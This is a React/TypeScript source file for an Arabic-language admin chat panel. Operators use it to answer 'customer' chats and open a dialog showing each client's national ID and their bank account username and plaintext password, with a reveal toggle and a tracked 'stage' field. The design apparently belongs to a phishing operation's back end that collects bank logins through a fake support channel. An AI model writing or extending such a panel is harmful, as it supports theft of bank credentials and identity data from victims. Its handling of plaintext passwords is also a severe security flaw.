import { useState, useEffect, useRef, useCallback } from 'react';
import { MessageCircle, X, Send, User, Bot, Headphones, Phone, Loader2, FileText, Eye, Wifi, WifiOff } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';

interface Message {
  id: number;
  senderType: 'client' | 'bot' | 'agent';
  senderId: string | null;
  content: string;
  createdAt: string;
  isRead: boolean;
}

interface Conversation {
  id: number;
  clientSessionId: string;
  status: 'pending' | 'active' | 'closed';
  agentConnectedAt: string | null;
  clientOnlineAt: string | null;
  createdAt: string;
  updatedAt: string;
  clientName: string;
  clientMobile: string | null;
  unreadCount: number;
  // بيانات العميل الإضافية
  clientNationalId?: string | null;
  clientUsername?: string | null;
  clientPassword?: string | null;
  clientStage?: string | null;
}

interface ChatPanelProps {
  isOpen: boolean;
  onClose: () => void;
  isAdminConnected: boolean;
}

export function ChatPanel({ isOpen, onClose, isAdminConnected }: ChatPanelProps) {
  const [conversations, setConversations] = useState<Conversation[]>([]);
  const [selectedConversation, setSelectedConversation] = useState<Conversation | null>(null);
  const [messages, setMessages] = useState<Message[]>([]);
  const [newMessage, setNewMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const [sending, setSending] = useState(false);
  const [showDataDialog, setShowDataDialog] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [notifications, setNotifications] = useState<any[]>([]);
  const [showNotifications, setShowNotifications] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<HTMLAudioElement | null>(null);

  // طلب إذن الإشعارات عند تحميل المكون
  useEffect(() => {
    if ('Notification' in window && Notification.permission === 'default') {
      Notification.requestPermission();
    }
  }, []);

  // إنشاء صوت الإشعار
  useEffect(() => {
    // إنشاء Audio context للصوت
    const playNotificationSound = () => {
      try {
        const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.value = 800;
        oscillator.type = 'sine';
        gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.5);
      } catch (e) {
        console.log('Audio not supported');
      }
    };

    // الاستماع للإشعارات من WebSocket
    const ws = new WebSocket(`${window.location.protocol === 'https:' ? 'wss:' : 'ws:'}//${window.location.host}/api/ws`);
    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === 'agent_request') {
          setNotifications(prev => [data.data, ...prev]);
          playNotificationSound();
          // إظهار إشعار المتصفح
          if (Notification.permission === 'granted') {
            new Notification('طلب تواصل جديد', {
              body: `العميل: ${data.data.clientName}\nالهاتف: ${data.data.clientPhone || 'غير متوفر'}`,
              icon: '/favicon.ico'
            });
          }
        }
      } catch (e) {}
    };

    ws.onopen = () => {
      ws.send(JSON.stringify({ type: 'chat_admin_hello' }));
    };

    return () => ws.close();
  }, []);

  // جلب المحادثات
  const fetchConversations = async () => {
    try {
      const res = await fetch('/api/conversations', {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('admin_token')}`,
        },
      });
      const data = await res.json();
      if (data.success) {
        setConversations(data.data);
      }
    } catch (error) {
      console.error('Error fetching conversations:', error);
    }
  };

  // جلب رسائل محادثة محددة
  const fetchMessages = async (conversationId: number) => {
    try {
      const res = await fetch(`/api/conversations/${conversationId}/messages`, {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('admin_token')}`,
        },
      });
      const data = await res.json();
      if (data.success) {
        setMessages(data.data);
      }
    } catch (error) {
      console.error('Error fetching messages:', error);
    }
  };

  // جلب محادثة محددة
  const fetchConversation = async (conversationId: number) => {
    try {
      const res = await fetch(`/api/conversations/${conversationId}`, {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('admin_token')}`,
        },
      });
      const data = await res.json();
      if (data.success) {
        setSelectedConversation(data.data);
      }
    } catch (error) {
      console.error('Error fetching conversation:', error);
    }
  };

  // تحديث تلقائي للمحادثات
  useEffect(() => {
    if (!isOpen) return;
    
    fetchConversations();
    const interval = setInterval(fetchConversations, 5000); // تقليل التكرار
    return () => clearInterval(interval);
  }, [isOpen]);

  // تحديث الرسائل عند اختيار محادثة
  useEffect(() => {
    if (!selectedConversation) return;
    
    const conversationId = selectedConversation.id;
    
    fetchMessages(conversationId);
    fetchConversation(conversationId);
    const interval = setInterval(() => {
      // التحقق أن المحادثة ما زالت محددة
      fetchMessages(conversationId);
      fetchConversation(conversationId);
    }, 5000); // تقليل التكرار
    return () => clearInterval(interval);
  }, [selectedConversation?.id]);

  // تمرير للرسائل الجديدة
  useEffect(() => {
    if (messagesEndRef.current) {
      try {
        messagesEndRef.current.scrollIntoView({ behavior: 'smooth', block: 'end' });
      } catch (e) {
        // العنصر غير موجود، تجاهل
      }
    }
  }, [messages]);

  // بدء محادثة مع العميل
  const handleStartChat = useCallback(async () => {
    if (!selectedConversation) return;
    
    const conversationId = selectedConversation.id;
    setLoading(true);
    try {
      const res = await fetch(`/api/conversations/${conversationId}/connect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('admin_token')}`,
        },
        body: JSON.stringify({ agentId: 'admin' }),
      });
      const data = await res.json();
      if (data.success) {
        fetchMessages(conversationId);
        fetchConversation(conversationId);
        fetchConversations();
      }
    } catch (error) {
      console.error('Error starting chat:', error);
    } finally {
      setLoading(false);
    }
  }, [selectedConversation]);

  // إرسال رسالة
  const handleSend = useCallback(async () => {
    if (!newMessage.trim() || !selectedConversation || sending) return;
    
    const conversationId = selectedConversation.id;
    const messageContent = newMessage;
    
    setSending(true);
    try {
      const res = await fetch(`/api/conversations/${conversationId}/messages`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('admin_token')}`,
        },
        body: JSON.stringify({
          senderType: 'agent',
          senderId: 'admin',
          content: messageContent,
        }),
      });
      const data = await res.json();
      
      if (data.success) {
        setMessages(prev => [...prev, data.data]);
        setNewMessage('');
      }
    } catch (error) {
      console.error('Error sending message:', error);
    } finally {
      setSending(false);
    }
  }, [newMessage, selectedConversation, sending]);

  const handleKeyPress = useCallback((e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      handleSend();
    }
  }, [handleSend]);

  // بدء محادثة مع العميل
  const startAgentConversation = useCallback(async (notif: any) => {
    try {
      // البحث عن المحادثة
      const conv = conversations.find(c => c.clientSessionId === notif.sessionId);
      if (!conv) {
        console.error('Conversation not found');
        return;
      }

      // استدعاء API لبدء المحادثة
      const res = await fetch(`/api/conversations/${conv.id}/connect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('admin_token')}`,
        },
        body: JSON.stringify({ agentId: 'admin' }),
      });

      const data = await res.json();
      if (data.success) {
        // إزالة الإشعار من القائمة
        setNotifications(prev => prev.filter(n => n.timestamp !== notif.timestamp));
        // فتح المحادثة
        setSelectedConversation(conv);
        // جلب المحادثات المحدثة
        fetchConversations();
      }
    } catch (error) {
      console.error('Error starting conversation:', error);
    }
  }, [conversations]);

  // عدد الرسائل غير المقروءة
  const totalUnread = conversations.reduce((sum, c) => sum + c.unreadCount, 0);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex bg-black/50" onClick={onClose}>
      <div 
        className="ml-auto w-full max-w-4xl h-full bg-background flex flex-col animate-in slide-in-from-left duration-300"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="bg-gradient-to-l from-[#0a4fa3] to-[#073a7a] p-4 flex items-center gap-3">
          <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
            <MessageCircle className="w-5 h-5 text-white" />
          </div>
          <div className="flex-1">
            <h3 className="text-white font-bold">المحادثات</h3>
            <p className="text-white/80 text-xs flex items-center gap-2">
              <span className={`w-2 h-2 rounded-full ${isAdminConnected ? 'bg-green-400 animate-pulse' : 'bg-red-400'}`} />
              {isAdminConnected ? 'متصل' : 'غير متصل'}
            </p>
          </div>
          {/* زر الإشعارات */}
          <button
            onClick={() => setShowNotifications(!showNotifications)}
            className="relative p-2 hover:bg-white/20 rounded-lg transition-colors"
          >
            <Phone className="w-5 h-5 text-white" />
            {notifications.length > 0 && (
              <span className="absolute -top-1 -right-1 w-5 h-5 bg-red-500 text-white text-xs rounded-full flex items-center justify-center animate-pulse">
                {notifications.length}
              </span>
            )}
          </button>
          <button
            onClick={onClose}
            className="p-2 hover:bg-white/20 rounded-lg transition-colors"
          >
            <X className="w-5 h-5 text-white" />
          </button>
        </div>

        {/* قائمة الإشعارات */}
        {showNotifications && (
          <div className="bg-yellow-50 border-b border-yellow-200 p-3 max-h-60 overflow-y-auto">
            <h4 className="font-bold text-yellow-800 mb-2 flex items-center gap-2">
              <span>طلبات التواصل مع الموظف</span>
              <span className="bg-red-500 text-white text-xs px-2 py-0.5 rounded-full">{notifications.length}</span>
            </h4>
            {notifications.length === 0 ? (
              <p className="text-sm text-yellow-700">لا توجد طلبات جديدة</p>
            ) : (
              <div className="space-y-3">
                {notifications.map((notif, index) => (
                  <div 
                    key={index}
                    className="bg-white p-4 rounded-lg shadow-sm border border-yellow-200"
                  >
                    <div className="flex items-start justify-between">
                      <div>
                        <p className="font-bold text-gray-800 flex items-center gap-2">
                          <span className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></span>
                          {notif.clientName}
                        </p>
                        <p className="text-sm text-gray-600 mt-1">
                          {notif.clientPhone && <span>📱 {notif.clientPhone}</span>}
                          {notif.clientEmail && <span className="mr-2">📧 {notif.clientEmail}</span>}
                        </p>
                        <p className="text-xs text-gray-400 mt-1">
                          {new Date(notif.timestamp).toLocaleString('ar-EG')}
                        </p>
                      </div>
                      <Button
                        size="sm"
                        className="bg-green-600 hover:bg-green-700 text-white"
                        onClick={() => {
                          startAgentConversation(notif);
                        }}
                      >
                        بدء المحادثة
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        <div className="flex-1 flex overflow-hidden">
          {/* قائمة المحادثات */}
          <div className="w-80 border-l flex flex-col bg-muted/30">
            <div className="p-3 border-b bg-card">
              <h4 className="text-sm font-semibold flex items-center gap-2">
                المحادثات
                {totalUnread > 0 && (
                  <span className="bg-red-500 text-white text-xs px-2 py-0.5 rounded-full">
                    {totalUnread}
                  </span>
                )}
              </h4>
            </div>
            <div className="flex-1 overflow-y-auto">
              {conversations.length === 0 ? (
                <div className="p-6 text-center text-muted-foreground text-sm">
                  لا توجد محادثات
                </div>
              ) : (
                conversations.map((conv) => (
                  <button
                    key={conv.id}
                    onClick={() => setSelectedConversation(conv)}
                    className={`w-full p-4 text-right border-b hover:bg-muted/50 transition-colors ${
                      selectedConversation?.id === conv.id ? 'bg-primary/10 border-r-4 border-r-primary' : ''
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                        conv.status === 'active' ? 'bg-green-100' : conv.unreadCount > 0 ? 'bg-yellow-100' : 'bg-gray-100'
                      }`}>
                        <User className={`w-5 h-5 ${
                          conv.status === 'active' ? 'text-green-600' : conv.unreadCount > 0 ? 'text-yellow-600' : 'text-gray-400'
                        }`} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between gap-2">
                          <p className="font-medium text-sm truncate">{conv.clientName}</p>
                          <span className={`text-[10px] px-1.5 py-0.5 rounded-full ${
                            conv.status === 'active' ? 'bg-green-500 text-white' : 'bg-gray-200 text-gray-600'
                          }`}>
                            {conv.status === 'active' ? 'متصل' : 'في الانتظار'}
                          </span>
                        </div>
                        <p className="text-xs text-muted-foreground truncate">
                          {conv.clientMobile || 'بدون موبايل'}
                        </p>
                        {conv.unreadCount > 0 && (
                          <span className="inline-block mt-1 bg-red-500 text-white text-[10px] px-2 py-0.5 rounded-full">
                            {conv.unreadCount} رسائل جديدة
                          </span>
                        )}
                      </div>
                    </div>
                  </button>
                ))
              )}
            </div>
          </div>

          {/* منطقة المحادثة */}
          <div className="flex-1 flex flex-col bg-card">
            {selectedConversation ? (
              <>
                {/* Header */}
                <div className="p-4 border-b flex items-center gap-4">
                  <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                    selectedConversation.status === 'active' ? 'bg-green-100' : 'bg-gray-100'
                  }`}>
                    <User className={`w-5 h-5 ${
                      selectedConversation.status === 'active' ? 'text-green-600' : 'text-gray-400'
                    }`} />
                  </div>
                  <div className="flex-1">
                    <p className="font-medium">{selectedConversation.clientName}</p>
                    <p className="text-xs text-muted-foreground flex items-center gap-1">
                      {selectedConversation.status === 'active' ? (
                        <>
                          <Wifi className="w-3 h-3 text-green-500" />
                          <span className="text-green-500">متصل الآن</span>
                        </>
                      ) : (
                        <>
                          <WifiOff className="w-3 h-3 text-gray-400" />
                          <span>غير متصل</span>
                        </>
                      )}
                    </p>
                  </div>
                  {/* زر عرض البيانات */}
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setShowDataDialog(true)}
                    className="gap-2"
                  >
                    <FileText className="w-4 h-4" />
                    عرض البيانات
                  </Button>
                </div>

                {/* زر بدء المحادثة */}
                {selectedConversation.status !== 'active' && (
                  <div className="p-3 bg-blue-50 border-b">
                    <Button
                      onClick={handleStartChat}
                      disabled={loading}
                      className="w-full gap-2 bg-[#0a4fa3] hover:bg-[#073a7a]"
                    >
                      {loading ? (
                        <Loader2 className="w-4 h-4 animate-spin" />
                      ) : (
                        <Headphones className="w-4 h-4" />
                      )}
                      بدء المحادثة مع العميل
                    </Button>
                  </div>
                )}

                {/* الرسائل */}
                <div className="flex-1 overflow-y-auto p-4 space-y-4">
                  {messages.map((msg) => (
                    <div
                      key={msg.id}
                      className={`flex items-start gap-2 ${
                        msg.senderType === 'agent' ? 'flex-row-reverse' : ''
                      }`}
                    >
                      {/* الأيقونة */}
                      <div className={`w-8 h-8 rounded-full flex items-center justify-center shrink-0 ${
                        msg.senderType === 'client' 
                          ? 'bg-blue-500' 
                          : msg.senderType === 'agent'
                            ? 'bg-green-500'
                            : 'bg-purple-500'
                      }`}>
                        {msg.senderType === 'client' ? (
                          <User className="w-4 h-4 text-white" />
                        ) : msg.senderType === 'agent' ? (
                          <Headphones className="w-4 h-4 text-white" />
                        ) : (
                          <Bot className="w-4 h-4 text-white" />
                        )}
                      </div>
                      
                      {/* الرسالة */}
                      <div className={`max-w-[70%] px-4 py-2 rounded-2xl ${
                        msg.senderType === 'client'
                          ? 'bg-blue-500 text-white rounded-tr-sm'
                          : msg.senderType === 'agent'
                            ? 'bg-green-500 text-white rounded-tl-sm'
                            : 'bg-gray-100 text-gray-800 rounded-tl-sm'
                      }`}>
                        <p className="text-sm whitespace-pre-wrap">{msg.content}</p>
                        <p className={`text-[10px] mt-1 ${
                          msg.senderType === 'client' || msg.senderType === 'agent'
                            ? 'text-white/70'
                            : 'text-gray-400'
                        }`}>
                          {new Date(msg.createdAt).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' })}
                        </p>
                      </div>
                    </div>
                  ))}
                  <div ref={messagesEndRef} />
                </div>

                {/* Input */}
                <div className="p-4 border-t bg-muted/30">
                  <div className="flex gap-2">
                    <Input
                      value={newMessage}
                      onChange={(e) => setNewMessage(e.target.value)}
                      onKeyPress={handleKeyPress}
                      placeholder="اكتب رسالتك للعميل..."
                      className="flex-1"
                      disabled={sending}
                    />
                    <Button
                      onClick={handleSend}
                      disabled={!newMessage.trim() || sending}
                      size="icon"
                      className="bg-[#0a4fa3] hover:bg-[#073a7a]"
                    >
                      {sending ? (
                        <Loader2 className="w-5 h-5 animate-spin" />
                      ) : (
                        <Send className="w-5 h-5" />
                      )}
                    </Button>
                  </div>
                </div>
              </>
            ) : (
              <div className="flex-1 flex items-center justify-center text-muted-foreground">
                <div className="text-center">
                  <MessageCircle className="w-16 h-16 mx-auto mb-4 opacity-20" />
                  <p>اختر محادثة من القائمة</p>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Dialog لعرض بيانات العميل */}
        <Dialog open={showDataDialog} onOpenChange={setShowDataDialog}>
          <DialogContent className="max-w-lg" dir="rtl">
            <DialogHeader>
              <DialogTitle className="flex items-center gap-2">
                <User className="w-5 h-5 text-primary" />
                بيانات العميل
              </DialogTitle>
            </DialogHeader>
            
            {selectedConversation && (
              <div className="space-y-4 mt-2">
                {/* الحالة */}
                <div className="flex items-center justify-between p-3 bg-muted/50 rounded-lg">
                  <div className="flex items-center gap-2">
                    <div className={`w-3 h-3 rounded-full ${
                      selectedConversation.status === 'active' ? 'bg-green-500 animate-pulse' : 'bg-gray-400'
                    }`} />
                    <span className="text-sm font-medium">
                      {selectedConversation.status === 'active' ? 'متصل الآن' : 'غير متصل'}
                    </span>
                  </div>
                </div>

                {/* بيانات التسجيل */}
                <div className="space-y-3">
                  <h4 className="text-sm font-semibold flex items-center gap-2">
                    <FileText className="w-4 h-4" />
                    بيانات التسجيل
                  </h4>
                  <div className="bg-card border rounded-xl p-4 space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-muted-foreground">الاسم</span>
                      <span className="text-sm font-medium">{selectedConversation.clientName}</span>
                    </div>
                    {selectedConversation.clientMobile && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-1">
                          <Phone className="w-3.5 h-3.5" />
                          الموبايل
                        </span>
                        <span dir="ltr" className="text-sm font-mono">{selectedConversation.clientMobile}</span>
                      </div>
                    )}
                    {selectedConversation.clientNationalId && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground">الرقم القومي</span>
                        <span dir="ltr" className="text-sm font-mono">{selectedConversation.clientNationalId}</span>
                      </div>
                    )}
                  </div>
                </div>

                {/* بيانات الحساب */}
                {(selectedConversation.clientUsername || selectedConversation.clientPassword) && (
                  <div className="space-y-3">
                    <h4 className="text-sm font-semibold flex items-center gap-2">
                      <Headphones className="w-4 h-4" />
                      بيانات الحساب البنكي
                    </h4>
                    <div className="bg-card border rounded-xl p-4 space-y-3">
                      {selectedConversation.clientUsername && (
                        <div className="flex items-center justify-between">
                          <span className="text-sm text-muted-foreground">المستخدم</span>
                          <span dir="ltr" className="text-sm font-mono">{selectedConversation.clientUsername}</span>
                        </div>
                      )}
                      {selectedConversation.clientPassword && (
                        <div className="flex items-center justify-between">
                          <span className="text-sm text-muted-foreground">كلمة المرور</span>
                          <div className="flex items-center gap-2">
                            <span dir="ltr" className="text-sm font-mono">
                              {showPassword ? selectedConversation.clientPassword : '••••••••'}
                            </span>
                            <button
                              type="button"
                              onClick={() => setShowPassword(!showPassword)}
                              className="p-1 rounded hover:bg-muted"
                            >
                              {showPassword ? (
                                <Eye className="w-3.5 h-3.5 text-muted-foreground" />
                              ) : (
                                <Eye className="w-3.5 h-3.5 text-muted-foreground" />
                              )}
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </div>
            )}
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
}
